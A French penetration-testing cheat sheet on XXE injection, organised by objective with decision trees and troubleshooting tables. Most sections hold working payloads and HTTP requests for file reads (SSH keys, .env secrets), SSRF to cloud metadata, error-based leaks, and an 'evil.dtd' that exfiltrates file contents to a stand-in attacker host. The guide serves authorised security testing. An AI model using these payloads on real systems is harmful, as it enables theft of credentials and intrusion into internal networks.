# XXE (XML External Entity) — Cheat Sheet

## 1. Périmètre et conventions

Cette fiche couvre la détection et l'exploitation des injections XXE, classées OWASP A05:2021 (Security Misconfiguration). Le mécanisme central : un parseur XML configuré pour résoudre les entités externes interprète une déclaration `ENTITY ... SYSTEM` comme une instruction légitime de lecture de fichier ou de requête réseau, à partir d'un document XML influençable par l'attaquant.

**Familles de techniques couvertes :**

- **XXE classique (in-band)** : entité externe résolue et réintégrée directement dans la réponse HTTP.
- **XXE → SSRF** : entité pointant vers une URL interne ; le serveur effectue la requête en son nom propre.
- **Blind XXE OAST** : confirmation de la résolution par callback DNS/HTTP vers un serveur OOB, sans lecture visible.
- **Blind XXE par erreur** : exfiltration via un message d'erreur provoqué contenant la donnée lue.
- **Blind XXE via DTD distant** : DTD chargé depuis un serveur attaquant, combinant entités paramètre pour exfiltrer en OOB.
- **Blind XXE via DTD local** : réutilisation d'un DTD système pour exfiltrer sans connexion sortante ni message d'erreur.
- **XXE via XInclude** : inclusion sans `DOCTYPE`, applicable quand seul un fragment du document est contrôlé.
- **Surface cachée** : fichiers SVG/DOCX uploadés, modification du `Content-Type`, endpoints XML non documentés.

**Outils :** Burp Suite (Repeater, Intruder, Collaborator), `curl`, `interactsh`.

**Conditions générales :** techniques applicables sous autorisation écrite sur des labs ou environnements de test.

**Conventions des exemples :**

| Placeholder | Signification |
|---|---|
| `cible.com` | Nom d'hôte fictif, à remplacer par la cible réelle autorisée |
| `attaquant.com` | Serveur sous contrôle de l'auditeur — doit être joignable depuis le serveur cible |
| `unique-id.oastify.com` | Domaine OOB (Burp Collaborator / `interactsh`) |
| `/etc/passwd` | Fichier cible d'exemple — adapter selon l'OS et la sensibilité recherchée |

> **Distinction fondamentale à conserver tout au long du test :**
> - Résolution d'entité confirmée (OAST) ≠ fichier exfiltré ≠ impact démontré.
> - Chaque étape ne prouve qu'une chose précise.

---

## 2. Tableau de repérage rapide

| Objectif | Technique | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Confirmer la résolution d'entité externe (blind) | Entité `SYSTEM` pointant vers domaine OOB | Tout endpoint XML, en premier test systématique | Callback DNS + HTTP sur le serveur OOB | Connexion sortante bloquée → passer au DTD local |
| Lire un fichier local (in-band) | `SYSTEM "file:///etc/passwd"` + référence dans un nœud réutilisé | Réponse HTTP susceptible de contenir la valeur du nœud modifié | Contenu du fichier dans la réponse | Fichier multi-lignes avec caractères spéciaux peut bloquer l'exfiltration in-band |
| Lire un fichier (blind, erreur) | Entité de fichier incluse dans un chemin inexistant → erreur avec valeur | Messages d'erreur parseur visibles côté client | Message d'erreur contenant le contenu du fichier | Application masquant les erreurs = inapplicable |
| Lire un fichier (blind, DTD distant) | DTD sur `attaquant.com` avec entités paramètre → exfiltration URL | Connexion sortante possible, erreurs masquées | Requête HTTP vers `attaquant.com` contenant le fichier en sous-domaine | Caractères spéciaux / multiligne rompent l'URL — fichiers courts préférables |
| Lire un fichier (blind, DTD local) | DTD système existant en hybride + redéfinition d'entité → erreur | Connexion sortante bloquée ET erreurs non affichées | Comportement d'erreur observable dans la réponse | Dépend de l'existence d'un DTD compatible sur le système et du comportement du parseur |
| Déclencher un SSRF | `SYSTEM "http://192.168.0.X/"` | Résolution d'entité confirmée, services internes présumés | Contenu du service interne dans la réponse (ou confirmation OOB) | Segmentation réseau, service interne authentifié |
| Exploiter sans contrôle du `DOCTYPE` | XInclude dans un nœud contrôlé | Seul un fragment du document est contrôlable | Contenu du fichier inclus dans la réponse | XInclude doit être activé sur le parseur |
| Surface cachée — upload de fichier | SVG ou DOCX contenant un DOCTYPE malveillant | Fonctionnalité d'upload traitant le fichier côté serveur | Même signal qu'une XXE in-band, via le contenu traité | Le parseur dédié au format peut avoir une config distincte du parseur XML principal |
| Surface cachée — Content-Type | Modifier `Content-Type` en `text/xml` sur un endpoint non-XML | Endpoint de formulaire susceptible d'accepter du XML | Comportement d'un parseur XML (erreur ou résolution) | L'application peut ignorer le XML sans le parser |

---

## 3. Techniques classées par objectif

### 3.1 Détecter — Sonde OAST systématique

**Objectif :** confirmer que le parseur résout les entités externes, sans supposer de fichier accessible ou de réponse visible.

**Quand l'utiliser :** en premier test sur tout endpoint acceptant du XML (explicite ou découvert).

**Prérequis :** serveur OOB disponible (Burp Collaborator, `interactsh`).

**Payload de référence :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://unique-id.oastify.com/">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

**Éléments à personnaliser :** `stockCheck` / `productId` → nœuds réels du document XML de l'application, `unique-id.oastify.com` → domaine OOB de l'auditeur.

**Signal attendu :**

| Interaction reçue | Ce qu'elle prouve |
|---|---|
| DNS uniquement | Résolution de nom côté serveur — parseur tente de résoudre l'entité, connexion HTTP non établie (ou bloquée) |
| DNS + HTTP GET | Résolution et connexion HTTP complètes — parseur résout l'entité externe, sans filtrage HTTP sortant |
| Aucune interaction | Connexion bloquée, entité non résolue, ou traitement asynchrone — ne pas conclure à l'absence de vulnérabilité sans tester les alternatives |

**Limites :** DNS uniquement ≠ preuve d'exfiltration de fichier ; connexion sortante bloquée → passer aux variantes sans réseau (sections 3.5, 3.6).

**Source :** cours fourni, sections 7.3 et 6.

---

### 3.2 Exploiter — XXE classique (in-band, fichier local)

**Objectif :** lire un fichier local dont le contenu est substitué dans un nœud réutilisé par la réponse de l'application.

**Quand l'utiliser :** parseur résout les entités (OAST confirmé ou sonde directe) ET la valeur d'au moins un nœud XML est reflétée dans la réponse.

**Prérequis :** identifier quel nœud du document XML voit sa valeur réutilisée par l'application dans sa réponse (message d'erreur, résultat affiché, écho de valeur).

**Payload de référence :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Éléments à personnaliser :** chemin du fichier (`file:///etc/passwd`), nœud portant la référence (`productId`).

**Fichiers cibles selon le contexte :**

| Cible | Chemin | Intérêt |
|---|---|---|
| Comptes système Linux | `file:///etc/passwd` | Preuve de concept standard |
| Clés SSH | `file:///root/.ssh/id_rsa` | Si processus = root |
| Secrets applicatifs | `file:///var/www/html/.env` | Identifiants, clés API |
| Config web | `file:///etc/apache2/sites-enabled/000-default.conf` | Structure applicative |
| Code source | `file:///var/www/html/index.php` | Lecture de code serveur |
| Config Windows | `file:///C:/Windows/win.ini` | Cible Windows |
| Métadonnées cloud AWS | `http://169.254.169.254/latest/meta-data/` | SSRF via entité HTTP |

**Signal attendu :** contenu du fichier affiché dans la réponse HTTP à l'emplacement où la valeur du nœud ciblé est habituellement réutilisée.

**Limites :** un fichier contenant des caractères XML spéciaux (`<`, `>`, `&`) peut provoquer une erreur de parsing lors de la substitution — utiliser un **wrapper CDATA** :

```xml
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % wrapper "<!ENTITY combined '%start;%file;%end;'>">
  %wrapper;
]>
<productId>&combined;</productId>
```

**Source :** cours fourni, sections 7.1 et 4.

---

### 3.3 Exploiter — XXE → SSRF

**Objectif :** forcer le serveur à effectuer une requête HTTP vers un système interne ou une URL arbitraire.

**Quand l'utiliser :** résolution d'entité confirmée, réseau interne à cartographier ou service interne à atteindre.

**Payload de référence :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.0.1/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

**Éléments à personnaliser :** IP et chemin de la ressource interne.

**Plages d'adresses à tester :**

```text
http://127.0.0.1/admin
http://localhost/admin
http://192.168.0.X/
http://10.0.0.X/
http://169.254.169.254/latest/meta-data/   ← IMDS cloud AWS
```

**Signal attendu (SSRF avec retour visible) :** contenu du service interne dans la réponse HTTP. **SSRF aveugle :** interaction OOB uniquement, ou délai observable.

**Limites :** segmentation réseau interne, authentification requise par le service ciblé.

**Source :** cours fourni, section 7.2.

---

### 3.4 Exploiter — Blind XXE par messages d'erreur

**Objectif :** exfiltrer le contenu d'un fichier via un message d'erreur du parseur, sans connexion réseau sortante nécessaire.

**Quand l'utiliser :** résolution d'entité confirmée (OAST), mais aucun nœud n'est reflété dans la réponse ET les messages d'erreur XML sont exposés.

**Prérequis :** le parseur expose ses erreurs dans la réponse HTTP (message contenant des détails de fichier ou de parsing).

**Principe :** construire un chemin de fichier inexistant intégrant la valeur lue, de sorte que l'erreur révèle cette valeur.

**Payload de référence (DTD interne — entités paramètre) :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///inexistant/%file;'>">
  %eval;
  %exfil;
]>
<foo>&xxe;</foo>
```

**Comment ça fonctionne :**
1. `%file` charge le contenu de `/etc/passwd`.
2. `%eval` déclare une entité `%exfil` qui tente de charger un chemin inexistant incluant le contenu de `%file`.
3. `%exfil` déclenche une erreur dont le message contient le chemin construit — et donc le contenu du fichier.

**Signal attendu :** message d'erreur parseur contenant des lignes de `/etc/passwd`.

**Limites :** entièrement dépendant de l'exposition des erreurs XML dans la réponse ; multiligne peut tronquer le résultat.

**Source :** cours fourni, section 7.3.

---

### 3.5 Exploiter — Blind XXE via DTD distant (OOB avancé)

**Objectif :** exfiltrer le contenu d'un fichier via une requête sortante vers un serveur contrôlé, en chargeant un DTD malveillant distant.

**Quand l'utiliser :** Blind XXE (pas de réflexion, pas d'erreur visible), connexion sortante HTTP possible.

**Prérequis :** serveur HTTP contrôlé par l'auditeur accessible depuis le serveur cible, DTD malveillant à héberger.

**Contenu du DTD à héberger sur `attaquant.com/evil.dtd` :**

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attaquant.com/?data=%file;'>">
%eval;
%exfil;
```

**Payload envoyé à la cible :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attaquant.com/evil.dtd">
  %dtd;
]>
<foo>test</foo>
```

**Signal attendu :** requête HTTP entrante sur `attaquant.com` avec le contenu du fichier en paramètre de l'URL.

**Limites critiques :** les caractères spéciaux (espace, `&`, `<`, `>`) et les sauts de ligne dans le fichier brisent l'URL construite. Préférer des fichiers courts sur une seule ligne (`/etc/hostname`, `/etc/issue`, `/proc/version`). Pour `/etc/passwd`, seule la première ligne peut être exfiltrée.

**Source :** cours fourni, section 7.4.

---

### 3.6 Exploiter — Blind XXE via DTD local (sans réseau sortant)

**Objectif :** exfiltrer des données quand ni la connexion sortante ni les messages d'erreur ne sont disponibles, en réutilisant un DTD système déjà présent sur la machine cible.

**Quand l'utiliser :** toutes les autres variantes Blind XXE échouent ; existence d'un DTD système sur la cible supposée.

**Prérequis :** un fichier DTD présent sur le système cible (fichiers installés par des packages logiciels), comportement de parseur autorisant un DTD hybride (interne + externe).

**DTD systèmes courants à tester :**

```text
/usr/share/xml/fontconfig/fonts.dtd          (Linux, package fontconfig)
/usr/share/yelp/dtd/docbookx.dtd            (Linux, package yelp)
/usr/share/doc/docbook-xsl-stylesheets/docbook.dtd  (variante)
```

**Principe :** un DTD hybride (DOCTYPE combinant DTD interne et référence à un DTD externe local) permet de redéfinir des entités du DTD local — ce qui n'est pas autorisé dans un DTD purement interne. Cela permet de combiner la lecture de fichier et le déclenchement d'une erreur révélatrice.

**Payload de référence (structure, à adapter au DTD cible) :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "/usr/share/xml/fontconfig/fonts.dtd" [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % ISOamsa '<!ENTITY &#x25; eval SYSTEM "file:///inexistant/%file;">
  %eval;'>
  %ISOamsa;
]>
<foo>test</foo>
```

**Note :** `ISOamsa` doit être un nom d'entité déjà défini dans le DTD local cible — à vérifier en lisant le DTD.

**Signal attendu :** comportement différent de l'application (erreur HTTP 500, message d'erreur spécifique) révélant l'exécution de l'entité.

**Limites :** fortement dépendant de la présence d'un DTD compatible et du comportement précis du parseur — technique à tenter après épuisement des autres variantes.

**Source :** cours fourni, section 7.5.

---

### 3.7 Exploiter — XXE via XInclude

**Objectif :** inclure une ressource externe dans un fragment de document XML contrôlé, sans pouvoir injecter de `DOCTYPE`.

**Quand l'utiliser :** seul un fragment du document est contrôlable (valeur d'un champ insérée dans un document XML construit par l'application) ; impossible de placer un `DOCTYPE` en tête du document.

**Prérequis :** XInclude activé sur le parseur.

**Payload de référence :**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Éléments à personnaliser :** valeur à injecter dans le champ contrôlé (tout le bloc XML ci-dessus).

**Signal attendu :** contenu du fichier inclus dans la réponse à l'emplacement du nœud injecté.

**Limites :** XInclude est une fonctionnalité distincte de la résolution d'entités — la désactivation des entités externes n'empêche pas XInclude si celui-ci reste activé.

**Source :** cours fourni, section 7.6.

---

### 3.8 Détecter — Surfaces d'attaque cachées

#### Upload de fichier SVG ou DOCX

**Quand l'utiliser :** fonctionnalité d'upload traitant des fichiers côté serveur (conversion, prévisualisation, analyse).

**SVG avec entité externe :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**DOCX :** injecter le payload dans `word/document.xml` (dans le fichier ZIP `.docx`) à l'intérieur d'un nœud de texte, avec un `DOCTYPE` en tête.

**Signal attendu :** contenu du fichier visible dans le résultat du traitement (rendu, aperçu, réponse de l'API).

**Limites :** le parseur traitant le format SVG/DOCX peut être distinct du parseur XML principal et avoir sa propre configuration.

#### Modification du `Content-Type`

**Quand l'utiliser :** endpoint non-XML suspecté d'accepter plusieurs formats.

```http
POST /login HTTP/1.1
Host: cible.com
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://unique-id.oastify.com/">
]>
<credentials>
  <username>&xxe;</username>
  <password>test</password>
</credentials>
```

**Signal attendu :** comportement différent de l'application (erreur 500, délai, ou callback OOB) indiquant que le XML a été parsé.

**Limites :** l'application peut simplement ignorer le corps si le `Content-Type` ne correspond pas à ce qu'elle attend.

**Source :** cours fourni, sections 7.7 et 7.8.

---

## 4. Payloads et syntaxes représentatifs

| Intention | Payload de référence | Contexte d'insertion | Variante utile | Différence apportée |
|---|---|---|---|---|
| Sonde OAST (entité classique) | `<!ENTITY xxe SYSTEM "http://oastify.com/">` + `&xxe;` dans un nœud | Corps XML, DOCTYPE injectée | Entité paramètre `<!ENTITY % xxe SYSTEM "..."> %xxe;` si entités classiques filtrées | Entités paramètre parfois moins filtrées que les entités classiques |
| Lecture de fichier local (in-band) | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` + `&xxe;` | Nœud dont la valeur est reflétée dans la réponse | `file:///C:/Windows/win.ini` | Cible Windows |
| SSRF vers IP interne | `<!ENTITY xxe SYSTEM "http://192.168.0.1/">` + `&xxe;` | Nœud reflété ou OAST | `http://169.254.169.254/latest/meta-data/` | Métadonnées cloud |
| Blind — erreur (entités paramètre) | Voir section 3.4 — construction `%file` + `%eval` + `%exfil` | DOCTYPE interne, entités paramètre uniquement | — | Un seul payload de référence ; adapter uniquement le fichier cible |
| Blind — DTD distant | `<!ENTITY % dtd SYSTEM "http://attaquant.com/evil.dtd"> %dtd;` | DOCTYPE interne, body XML | — | Adapter le contenu du DTD distant selon le fichier à lire |
| Blind — DTD local | Voir section 3.6 — DOCTYPE hybride + redéfinition | DOCTYPE hybride (SYSTEM + interne) | Adapter `ISOamsa` au nom d'entité existant dans le DTD local ciblé | Fortement dépendant du DTD disponible sur le système |
| XInclude | `<xi:include parse="text" href="file:///etc/passwd"/>` avec namespace | Nœud contrôlé dans le document | `parse="xml"` (sans guillemets) pour inclusion XML structurée | `parse="text"` = inclut comme texte brut, évite les erreurs de parsing |
| SVG malveillant | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` dans l'en-tête SVG | Fichier `.svg` uploadé | DOCX : injecter dans `word/document.xml` | Format différent, même mécanisme DTD |

---

## 5. Encodages, formats et représentation des entrées

| Représentation | Contexte | Pourquoi utile |
|---|---|---|
| `&#x25;` (= `%` encodé en entité XML) | À l'intérieur d'une valeur d'entité paramètre dans une DTD interne | Les caractères `%` dans les valeurs d'entités imbriquées doivent être encodés pour éviter une interprétation immédiate par le parseur |
| `file:///etc/passwd` | Protocole de fichier local | Chemins absolus Linux ; `file:///C:/Windows/...` pour Windows |
| `file:///etc/passwd` (3 slashes) | URI standard pour fichier local | 2 slashes = autorité, 3e slash = début du chemin absolu |
| `http://` | Requête HTTP via entité externe | Déclenche SSRF ou OAST |
| `https://` | Idem | Certains parseurs ne supportent que `http://` — tester les deux |
| Chemin relatif dans DTD | `SYSTEM "evil.dtd"` | Si le fichier DTD est servi depuis le même domaine que le fichier XML — rare |
| `parse="text"` dans XInclude | Attribut de `xi:include` | Inclut le contenu comme texte brut, sans re-parser ; évite les erreurs si le fichier contient du XML invalide |

**Condition d'inefficacité :** si le parseur est configuré avec `FEATURE_DISALLOW_DOCTYPE_DECL = true` ou équivalent, aucun DOCTYPE n'est accepté, quelle que soit la syntaxe — la résolution d'entités externes est structurellement bloquée. Dans ce cas, tenter XInclude si activé, puis passer aux surfaces cachées.

---

## 6. Exemples de requêtes HTTP

### 6.1 XXE classique sur endpoint de stock

```http
# Référence — requête légitime
POST /product/stock HTTP/1.1
Host: cible.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

```http
# Version modifiée — lecture de /etc/passwd via entité externe
POST /product/stock HTTP/1.1
Host: cible.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

- **Changement clé :** ajout du `DOCTYPE` avec entité externe ; référence `&xxe;` dans `productId`.
- **Signal recherché :** contenu de `/etc/passwd` là où `productId` est habituellement réutilisé dans la réponse.
- **Ce que cela ne prouve pas seul :** qu'un autre fichier est accessible — tester chaque cible individuellement.

### 6.2 Sonde OAST (Blind XXE)

```http
POST /product/stock HTTP/1.1
Host: cible.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://unique-id.oastify.com/">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

- **Changement clé :** `SYSTEM` pointe vers le domaine OOB au lieu d'un fichier local.
- **Signal recherché :** interaction DNS + HTTP sur le serveur OOB — confirme la résolution sans dépendre d'une réflexion dans la réponse.
- **Ce que cela ne prouve pas seul :** que la lecture de fichier est possible (l'entité peut être résolue via HTTP sans que `file://` soit autorisé).

### 6.3 Blind XXE via DTD distant (exfiltration OOB)

```http
# Payload côté cible
POST /product/stock HTTP/1.1
Host: cible.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attaquant.com/evil.dtd">
  %dtd;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

```xml
<!-- Contenu de evil.dtd sur attaquant.com -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attaquant.com/?data=%file;'>">
%eval;
%exfil;
```

- **Changement clé :** le DOCTYPE charge un DTD externe depuis le serveur attaquant ; le DTD orchestre la lecture de fichier et l'exfiltration OOB.
- **Signal recherché :** requête HTTP vers `attaquant.com` avec le contenu de `/etc/hostname` en paramètre.
- **Ce que cela ne prouve pas seul :** que des fichiers multi-lignes (comme `/etc/passwd`) peuvent être exfiltrés en entier — les retours à la ligne cassent l'URL.

### 6.4 XInclude sur endpoint JSON/form

```http
# Endpoint utilisant un formulaire — modification du Content-Type et du corps
POST /data HTTP/1.1
Host: cible.com
Content-Type: text/xml

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

- **Changement clé :** `Content-Type` passé à `text/xml` ; corps entièrement remplacé par la charge XInclude.
- **Pourquoi XInclude ici :** pas de `DOCTYPE` nécessaire — applicable même si l'injection de DOCTYPE est bloquée.

---

## 7. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Exemple minimal | Limite ou précaution |
|---|---|---|---|---|
| Burp Repeater | Modification manuelle du corps XML et observation de la réponse | Toutes les phases de test | Remplacer la valeur d'un nœud par `&xxe;` après ajout du DOCTYPE | Penser à encoder les caractères XML spéciaux dans les valeurs inchangées |
| Burp Collaborator | Serveur OOB DNS/HTTP pour OAST | Détection blind, exfiltration via DTD distant | Générer un sous-domaine unique, l'insérer dans `SYSTEM "http://..."` | Nécessite Burp Pro ; interactions asynchrones peuvent arriver avec délai |
| `interactsh` | Alternative open-source à Collaborator | Idem sans Burp Pro | `interactsh-client` → domaine unique → insérer dans le payload | Connexion réseau sortante depuis la cible requise |
| `curl` | Envoi rapide de payload XXE, test de surface cachée | Validation rapide d'un endpoint, test `Content-Type` | `curl -X POST cible.com/stock -H "Content-Type: application/xml" --data @payload.xml` | Moins pratique que Burp pour itérer sur les variantes |
| Serveur HTTP simple (`python3 -m http.server`) | Hébergement du DTD distant | Blind XXE via DTD distant | `python3 -m http.server 8080` dans le répertoire contenant `evil.dtd` | Doit être joignable depuis le serveur cible |

---

## 8. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| Interaction DNS + HTTP sur serveur OOB | Résolution d'entité externe confirmée — parseur vulnérable | Tester `file:///etc/passwd` in-band pour vérifier si la lecture de fichier est également possible | Que la résolution OOB prouve automatiquement la lecture de fichier — `http://` et `file://` peuvent être traités différemment |
| Contenu de `/etc/passwd` dans la réponse | XXE in-band confirmée avec impact de lecture de fichier | Identifier d'autres fichiers sensibles accessibles selon le processus du parseur | Que tous les fichiers sont accessibles — les permissions système s'appliquent |
| Erreur 500 au lieu d'une erreur normale sur le nœud modifié | Le parseur a tenté de résoudre l'entité et a rencontré un problème | Examiner le message d'erreur — contient-il un chemin de fichier ou une valeur qui n'était pas dans la requête ? | Qu'une erreur 500 sans détail confirme la XXE — peut avoir une autre origine |
| Message d'erreur contenant une valeur inattendue ressemblant au contenu d'un fichier | Blind XXE par erreur partiellement fonctionnelle | Confirmer avec un fichier dont le contenu est connu (`/etc/hostname`) pour valider le mécanisme | Qu'un message d'erreur partiel garantit l'exfiltration complète du fichier |
| Délai anormal sur la requête avec entité HTTP pointant vers une IP interne | SSRF aveugle probable — le serveur tente de se connecter | Confirmer avec un domaine OOB d'abord, puis cibler des IPs internes | Qu'un timeout prouve l'inexistence du service — peut être un filtrage réseau |
| Même réponse avec et sans `DOCTYPE` | Parseur ne résout pas les entités ou DOCTYPE ignoré | Tester XInclude, puis modification du `Content-Type`, puis formats de fichiers uploadés | Que l'absence de changement prouve la sécurité du parseur — peut être une surface cachée |

---

## 9. Choisir la variante selon le contexte

```text
1. L'application reflète la valeur du nœud XML dans sa réponse ?
   └── OUI → XXE classique in-band [section 3.2]
   └── NON → BLIND XXE

2. (BLIND) Connexion réseau sortante possible vers un serveur OOB ?
   ├── OUI → Sonde OAST d'abord [section 3.1]
   │          └── Résolution confirmée ?
   │              ├── OUI + erreurs visibles → Blind XXE par erreur [section 3.4]
   │              └── OUI sans erreurs → Blind XXE via DTD distant [section 3.5]
   └── NON → Messages d'erreur parseur visibles ?
              ├── OUI → Blind XXE par erreur [section 3.4]
              └── NON → DTD système sur la cible ?
                         ├── OUI → Blind XXE via DTD local [section 3.6]
                         └── NON → Surface cachée ou XInclude [sections 3.7, 3.8]

3. DOCTYPE non injectable (contrôle partiel du document) ?
   └── → XInclude si activé [section 3.7]

Règle : ne changer qu'une seule variable entre deux tests.
Un test sans signal ne prouve pas l'absence de vulnérabilité — vérifier chaque variante indépendamment.
```

---

## 10. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Aucun signal ni erreur après ajout du DOCTYPE | DOCTYPE refusé (fonctionnalité désactivée), ou parseur sécurisé | Vérifier si la réponse change quand on envoie un DOCTYPE syntaxiquement invalide | Tester XInclude et la surface `Content-Type` | Que ce vecteur précis est fermé — pas que l'application est exempte de XXE |
| Callback DNS uniquement (pas HTTP) | Connexion HTTP sortante bloquée par le pare-feu réseau | Tester avec `file://` in-band — si réfléchi, parseur résout aussi les fichiers | Passer aux variantes sans connexion sortante (erreur, DTD local) | Que DNS peut sortir mais HTTP est filtré — utile pour choisir la variante Blind |
| Contenu partiel du fichier dans la réponse (premières lignes seulement) | Caractères spéciaux dans le fichier coupant la substitution XML | Tester un fichier court sur une ligne (`/etc/hostname`) pour confirmer le mécanisme | Utiliser le wrapper CDATA pour les fichiers complexes | Que la technique fonctionne — adapter le fichier cible ou l'encodage |
| DTD distant non chargé (pas de requête sur `attaquant.com`) | Connexion HTTP sortante bloquée, ou `attaquant.com` inaccessible depuis la cible | Vérifier d'abord la connexion OOB avec une entité simple | Passer aux variantes sans connexion sortante | Que le serveur cible ne peut pas sortir sur HTTP — ne prouve pas que `file://` est bloqué |
| XInclude sans effet | XInclude non activé sur le parseur ; espace de noms non reconnu | Vérifier que la valeur injectée apparaît dans la réponse (echo), puis tester le namespace XInclude avec un fichier connu | — | Que XInclude est désactivé ou non pris en charge par ce parseur |
| DOCX/SVG uploadé sans déclenchement | Bibliothèque tierce avec parseur séparé et sécurisé | Tester le fichier avec le parseur XML principal si accessible directement | Identifier quelle bibliothèque traite le format (log d'erreur, header de réponse) | Que ce parseur spécifique est sécurisé indépendamment du parseur principal |

---

## 11. Checklist d'utilisation

- [ ] Tout endpoint acceptant du XML (explicite ou découvert via modification de `Content-Type`) est testé.
- [ ] La sonde OAST est envoyée en premier, avant toute tentative de lecture de fichier.
- [ ] Le nœud XML portant la référence `&xxe;` est bien un nœud dont la valeur est réutilisée dans la réponse (pour la variante in-band).
- [ ] La variante Blind est choisie selon le contexte (présence de connexion sortante, visibilité des erreurs) — arbre de décision section 9.
- [ ] Une seule variable est modifiée entre deux tests (fichier cible, variante, nœud portant l'entité).
- [ ] Un signal DNS seul n'est pas conclu comme preuve de lecture de fichier.
- [ ] Les fichiers multi-lignes sont testés avec le wrapper CDATA ou remplacés par des fichiers courts pour la variante DTD distant.
- [ ] XInclude est testé indépendamment des entités externes (mécanisme distinct, désactivation distincte).
- [ ] Les surfaces cachées (SVG, DOCX, endpoints non-XML) sont incluses dans le périmètre de test.
- [ ] L'impact concret est démontré (fichier exfiltré ou service interne atteint), pas seulement la résolution d'entité.

---

## 12. Sources et liens de référence

- [PortSwigger Web Security Academy — XXE Injection](https://portswigger.net/web-security/xxe)
- [OWASP Top 10 — A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [MITRE CWE-611 — Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- Documentation de la bibliothèque XML utilisée par l'application cible — pour les options de désactivation de la résolution d'entités externes spécifiques à l'implémentation.
- Voir aussi : fiche complémentaire `cheatsheet-ssrf.md` (XXE utilisée comme vecteur SSRF, section 6.2) et `cheatsheet-lfi-rfi-upload.md` (upload de fichier SVG/DOCX comme surface d'attaque XXE).
